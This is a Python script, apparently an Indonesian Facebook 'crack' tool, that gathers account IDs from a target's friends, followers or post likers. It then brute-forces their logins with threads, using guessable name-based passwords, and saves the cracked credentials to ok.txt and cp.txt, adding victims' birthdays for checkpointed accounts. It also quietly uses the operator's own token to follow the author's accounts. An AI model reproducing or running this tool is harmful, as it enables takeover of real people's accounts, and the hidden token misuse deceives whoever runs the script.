# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" "+N+"[!] Module requests not installed yet")
	exit(" "+N+"[#] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))

ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/amdiutama/kangmaling/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('results')
		menu()
	except (KeyError,IOError):
		os.system("results")
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/amdiutama/kangmaling/main/ua.txt").text.strip()
	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua")
	os.system("clear")
	print(" \033[0;96mAU"+N+" : ANGGA KURNIAWAN\n"+N+" \033[0;91mFB"+N+" : FB.ME/GAAAARZXD\n"+N+" \033[0;93mRC"+N+" : K4N9 M4L!N9")
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' '+N+' [!] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000141059300/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100018047723947/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100054520182692/subscribers?access_token=' + token)
    print(" "+N+"[+] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		print(" "+N+"\n [!] Saat mengambil Cookies/Token gunakan: \n    m.facebook.com")
		print(" "+N+"\n [?] Select Login Metode "+N+"!!")
		print(" "+N+"[1] Login With Token")
		print(" "+N+"[2] Login With Cookie")
		ask = raw_input("\n "+N+" [?] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	print(" "+N+" [!] Enter Your Facebook Cookies "+N+"!!")
	cookie = raw_input(" "+N+"[+] Your Cookie : ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " "+N+"[!] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' '+N+'[!] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		print(" "+N+"[!] Enter Your Token Facebook !!")
		token = raw_input(" "+N+"[+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" "+N+"[!] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('.Status','r').read()
		stass = "Premium *"
	except IOError:
		stass = "Premium"
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' '+N+' [!] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	    	user = a['username']
	except KeyError:
		os.system('clear')
		print(' '+N+' [!] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' '+N+' [!] Please Check Your Network !!')
	try:
		token = open('hai.txt','r').read()
	except IOError:
		os.system("results")
		os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")
	logo()
        print(" "+N+"[#] -------------------------------------------")
	print(" "+N+"[+] Nama : "+N+"%s"%(nama))
        print(" "+N+"[+] IP   : "+N+ip)
	print(" "+N+"[#] -------------------------------------------")
	print
	print("      "+N+"[  "+N+"Salam NgeCroot !!"+N+"]")
	print
	print(" "+N+"[#] -------------------------------------------")
	print(" "+N+"[1] Crack From Public FriendList")
	print(" "+N+"[2] Crack From Follower")
	print(" "+N+"[3] Crack From Reaction")
	print(" "+N+"[4] Check Result")
	print(" "+N+"[5] Setting UserAgent")
	print(" "+N+"[0] Logout (delete token)")
	print(" "+N+"[#] -------------------------------------------")
	ask = raw_input("\n "+N+"[?] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		print(" "+N+"\n [?] Options "+N+"!!")
		print(" "+N+"[1] Crack Indonesia")
		print(" "+N+"[2] Crack India/Bangladesh")
		print(" "+N+"[3] Back to menu")
		if ask =="":
			menu()
		ask = raw_input("\n "+N+" [?] Choose : ")
		if ask =="":
			crot()
		elif ask == "1" or ask == "01":
			indo()
		elif ask == "2" or ask == "02":
			celek()
		elif ask == "3" or ask == "03":
			menu()
		else:
			menu()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n "+N+"[1] Cek hasil OK")
		print(" "+N+"[2] Cek hasil CP")
		ask = raw_input("\n "+N+"[?] Pilih : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("/ok.txt").read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results OK Date : %s-%s-%s Total : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat /ok.txt")
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
				exit(" "+N+"[!] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("/cp.txt").read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results CP Date : %s-%s-%s Total : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat /cp.txt")
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
				exit(" "+N+"[!] Tidak ada hasil Bro")
		else:
			menu()
	elif ask == "5" or ask == "05":
		settingua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" "+N+" [#] Successfully  Token")
	elif ask == "9" or ask == "99":
		exit(p+"Terima Kasih Telah Menggunakan Script Saya...:)")
	else:
		menu()
 
def indo():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+' [!] Token Invalid')
		tokenz()
	print("\n "+N+"[+] Type 'me' to Crack From The Friends List")
	idt = raw_input(" "+N+"[+] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+] Name : "+sp["name"])
	except KeyError:
		exit(' '+N+'[!] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total IDs  : "+str(len(id)))
	print("\n "+N+"[!] Default password : name123,name1234,name12345,sayang,bangsat,anjing")
	print("\n "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/n : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'sayang','bangsat','anjing']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('/ok.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[+] Your OK results saved in : /ok.txt")
	exit("\n "+N+"[+] Your CP results saved in : /cp.txt")
	
def celek():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+' [!] Token Invalid')
		tokenz()
	print("\n "+N+"[+] Type 'me' to Crack From The Friends List")
	idt = raw_input(" "+N+"[+] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+] Name : "+sp["name"])
	except KeyError:
		exit(' '+N+'[!] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total ID  : "+str(len(id)))
	print("\n "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	print(" "+N+"[!] Crack menggunakan 9 list sandi.")
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),name.lower()+'786','102030','111222','445566','786786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('/ok.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('/cp.txt' % (ha, op, ta),'a') 
						save.write(str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					cp.append(uid+'|'+pw)
					print('\r '+K+'[CP] '+N+uid+ '|' + pw + '|' + ttl)
					save = open('/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'|'+ttl+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[+] Your CP results saved in : /cp.txt")

def followers():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+'[!] Token Invalid')
		tokenz()
	print("\n "+N+"[*] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" "+N+"[+] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+] Name : "+sp["name"])
	except KeyError:
		exit(' '+N+'[+] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[+] Total IDs  : "+str(len(id)))
	print("\n "+N+"[!] Default password : name123,name1234,name12345,firstname")
	print("\n "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/n : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('/ok.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[+] Your OK results saved in : /ok.txt")
	exit("\n "+N+"[+] Your CP results saved in : /cp.txt")

def reaction():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' '+N+'[!] Token Invalid')
		tokenz()
	print("\n "+N+"[*] Ex :/post/629986xxxxx"+N+" (only id post)")
	idt = raw_input(" "+N+"[+] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+] Name : "+sp["name"])
	except KeyError:
		exit(' '+N+'[+] ID Postingan Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total IDs  : "+str(len(id)))
	print(" "+N+"[#] -------------------------------------------")
	print("\n "+N+"[!] Default password : name123,name1234,name12345,firstname")
	print("\n "+N+"[!] Ketik ctrl+z untuk berhenti crack.")
	ask = raw_input("\n "+N+"[?] Want to Use a Manual Password? Y/n : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('/ok.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+uid+ '|'+ pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[+] Your OK results saved in : /ok.txt")
	exit("\n "+N+"[+] Your CP results saved in : /cp.txt")

def manual():
	print(" "+N+"[*] Exp : paptete,ngocok,rondodugal")
	pw = raw_input("\n "+N+"[?] Set Password : ").split(",")
	if len(pw) ==0:
		exit(" "+N+"[!] Don't Be Empty")
	print(" "+N+"-----------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK] '+N+'' +uid+ '|' + asu + '                  ')
					ok.append(uid+'|'+asu)
					save = open('/ok.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP] '+N+'' +uid+ '|' + asu + '                  ')
					cp.append(uid+'|'+asu)
					save = open('/cp.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[+] Your OK results saved in : /ok.txt")
	exit("\n "+N+"[+] Your CP results saved in : /cp.txt")
	
### SETTING USER AGENT
def settingua():
	ask = raw_input("\n "+N+"[?] Do you want to change the User Agent ? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n "+N+"[*] Type in chrome search : My User Agent")
			ua = raw_input(" "+N+"[+] Your User Agent : ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" "+N+"[✓] Successfully changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/amdiutama/kangmaling/main/ua.txt").text.strip()
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n "+N+"[✓] Successfully changing User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()

if __name__ == '__main__':
	os.system("git pull")
	login()
